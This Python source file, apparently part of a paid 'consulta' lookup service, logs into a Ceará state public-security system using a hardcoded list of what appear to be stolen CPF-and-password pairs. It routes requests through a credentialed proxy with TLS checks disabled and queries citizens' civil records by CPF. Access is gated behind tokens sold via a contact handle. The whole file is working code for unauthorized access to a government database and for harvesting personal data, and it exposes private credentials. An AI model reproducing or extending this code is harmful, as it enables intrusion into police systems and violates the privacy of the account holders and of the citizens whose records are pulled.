import sqlite3
import requests
from auth.validacao import validacao
from flask import jsonify
import base64
import random
import urllib3
from config import DB_PATH  # Importa o caminho do banco de config.py



username = "q9cgjcd6ozrlo92-country-br"
password = "f7k9se8zqxuaprn"
proxy = "rp.scrapegw.com:6060"
proxy_auth = "{}:{}@{}".format(username, password, proxy)
proxies = {
    "http":"http://{}".format(proxy_auth)
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def GetStr(texto, inicio, fim):
    try:
        return texto.split(inicio)[1].split(fim)[0]
    except Exception:
        return "S/N"
    
def logar(cpf, senha):
    headers = {
    'Host': 'spi.sspds.ce.gov.br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'DNT': '1',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://spi.sspds.ce.gov.br',
    'Referer': 'https://spi.sspds.ce.gov.br/oauth2/index.html',
    'Accept-Language': 'pt-BR,pt;q=0.9',
}

    json_data = {
        'cpf': cpf,
        'password': senha,
        'appServerKey': '46dff8f1542d243a069b86eb95d5108e11a67455',
    }

    response = requests.post('https://spi.sspds.ce.gov.br/api/siaa/auth', headers=headers, json=json_data, verify=False, proxies=proxies).text

    token = GetStr(response, '"token":"', '"')

    if 'token":"' in response:
        with open("./token.txt", 'w') as f:
            f.write(token)
    else:
        print(f"[+] {cpf}:{senha} [ {response} ]")
        
def pegar_token():
    with open("token.txt", "r", encoding='utf-8') as f:
        token = f.read().strip()
    return token

#Token inválido

def consultar_ft_ce():
        
    return jsonify({'erro': 'retestar - pos estava fazendo o login dnv'})

def consultar_ft_ce_verdadeira(cpf, token):
    token_login = pegar_token()
    cpf = cpf.replace('-', '').replace('.', '')
    if not validacao(token):
        return jsonify({'erro': 'Token invalido, chame @klzinnn para adquirir'})


    cookies = {
    '_ga': 'GA1.1.360408394.1737750559',
    '_ga_NDXT03GPSB': 'GS1.1.1737750559.1.1.1737751493.0.0.0',
}

    headers = {
        'Authorization': 'JWT '+token_login,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Client': '46dff8f1542d243a069b86eb95d5108e11a67455',
        'Client-Version': '0.15.0',
        'Client-Name': 'CEREBRUM',
        'Referer': 'https://spi.sspds.ce.gov.br/cerebrum',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    

    params = {
        'cpf': cpf,
    }

    response = requests.get('https://spi.sspds.ce.gov.br/api/cerebrum/civil/details', params=params, cookies=cookies, headers=headers, verify=False, proxies=proxies).text
    
    if 'basicInfo' in response:
        return response
    if 'Token inválido' or 'O token enviado está expirado. Acesse novamente a plataforma.' in response:
        dados = {
    '87598850330': 'Dica1006',
    '73276669315': 'for189980',
    '47240997391': 'Sheyla12',
    '02674559330': 'Mar325127',
    '82251002391': 'Me01062012',
    '01041431341': 'kassio111',
    '03770847350': 'Vaquejada10',
    '04401789326': 'RF13081992',
    '83588795391': 'dnf4115',
    '75236680387': 'eva28ryan28',
    '62854658353': 'lrcjlrcj',
    '01177126397': 'senha123',
    '03341614362': 'D@vi0810',
    '00874206359': 'Rcesar12345',
    '04296694375': 'lanhouse',
    '43078508315': '241310',
    '01404265317': 'cha22063',
    '77843797300': '74859610',
    '54449979320': 'sinistra',
    '44595824300': '030573',
    '01643637347': '7596It@lo',
    '26277476300': '2781707',
    '00561780340': 'Civil2018'
}


        cpf_aleatorio = random.choice(list(dados.keys()))
        senha_correspondente = dados[cpf_aleatorio]

        logar(cpf_aleatorio, senha_correspondente)
        return jsonify({'erro': 'retestar - pos estava fazendo o login dnv'})
    else:
        return response